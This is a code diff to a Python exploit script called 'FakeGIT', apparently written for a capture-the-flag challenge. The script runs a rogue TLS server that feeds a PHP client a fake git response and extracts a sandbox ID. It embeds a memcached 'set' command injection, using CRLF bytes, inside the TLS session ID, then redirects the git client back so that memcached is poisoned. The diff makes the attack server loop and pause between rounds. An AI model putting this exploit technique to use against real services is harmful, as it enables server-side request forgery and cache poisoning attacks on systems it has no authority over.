@@ -5,6 +5,7 @@ import hmac
 import re
 import socket
 import struct
+import time
 from Crypto.Cipher import AES
 from Crypto.PublicKey import RSA
 from dataclasses import dataclass
@@ -254,44 +255,48 @@ if __name__ == '__main__':
         for cert in Path(args.cert).read_text().split('\n\n')
     ]
 
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_socket.bind(('0.0.0.0', args.port))
-    server_socket.listen(1)
+    while True:
+        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        server_socket.bind(('0.0.0.0', args.port))
+        server_socket.listen(1)
 
-    print('Welcome to FakeGIT')
+        print('Welcome to FakeGIT')
 
-    should_serve = True
-    session_id = b''
+        should_serve = True
+        session_id = b''
 
-    while should_serve:
-        client_socket, address = server_socket.accept()
-        print(f'Got a connection from {address}')
-        tls = TLS(client_socket, priv_key, certs, session_id)
+        while should_serve:
+            client_socket, address = server_socket.accept()
+            print(f'Got a connection from {address}')
+            tls = TLS(client_socket, priv_key, certs, session_id)
 
-        http_request = tls.read()
-        if b'User-Agent: git' in http_request:
-            print('This is git! Redirecting it back to memcached and shutting down')
-            assert session_id, 'Session id should have been set at this point'
-            headers = {
-                'Location': f'https://fakegit.cursed.page:{args.port}/pwned',
-            }
-            tls.write(get_http_response(302, headers, ''))
-            should_serve = False
-        else:
-            print('This is PHP! Showing them something that looks like a git repo and stealing sandbox ID')
+            http_request = tls.read()
+            if b'User-Agent: git' in http_request:
+                print('This is git! Redirecting it back to memcached and shutting down')
+                assert session_id, 'Session id should have been set at this point'
+                headers = {
+                    'Location': f'https://fakegit.cursed.page:{args.port}/pwned',
+                }
+                tls.write(get_http_response(302, headers, ''))
+                should_serve = False
+            else:
+                print('This is PHP! Showing them something that looks like a git repo and stealing sandbox ID')
 
-            b64_sandbox_id = re.search(b'GET /(.*?)/', http_request).group(1)
-            while len(b64_sandbox_id) % 4 != 0:
-                b64_sandbox_id += b'='
-            sandbox_id = base64.b64decode(b64_sandbox_id)
-            assert len(sandbox_id) == 10, f'The sandbox id should have exactly 10 bytes, got: {sandbox_id}'
-            session_id = b'\r\nset ' + sandbox_id + b';/r* 0 0 2\r\nOK\r\n'
-            assert len(session_id) == 32, f'The session should have exactly 32 bytes, got: {session_id}'
-            print(f'Got sandbox id: {sandbox_id}, session_id: {session_id}')
+                b64_sandbox_id = re.search(b'GET /(.*?)/', http_request).group(1)
+                while len(b64_sandbox_id) % 4 != 0:
+                    b64_sandbox_id += b'='
+                sandbox_id = base64.b64decode(b64_sandbox_id)
+                assert len(sandbox_id) == 10, f'The sandbox id should have exactly 10 bytes, got: {sandbox_id}'
+                session_id = b'\r\nset ' + sandbox_id + b';/r* 0 0 2\r\nOK\r\n'
+                assert len(session_id) == 32, f'The session should have exactly 32 bytes, got: {session_id}'
+                print(f'Got sandbox id: {sandbox_id}, session_id: {session_id}')
 
-            fake_git = '001e# service=git-upload-pack\n'
-            tls.write(get_http_response(200, {}, fake_git))
+                fake_git = '001e# service=git-upload-pack\n'
+                tls.write(get_http_response(200, {}, fake_git))
 
-        client_socket.close()
+            client_socket.close()
 
-    print('All done! memcached now should be poisoned')
+        server_socket.close()
+        print('Laying low for 5 seconds so that the git client doesn\'t reconnect to us')
+        time.sleep(5)
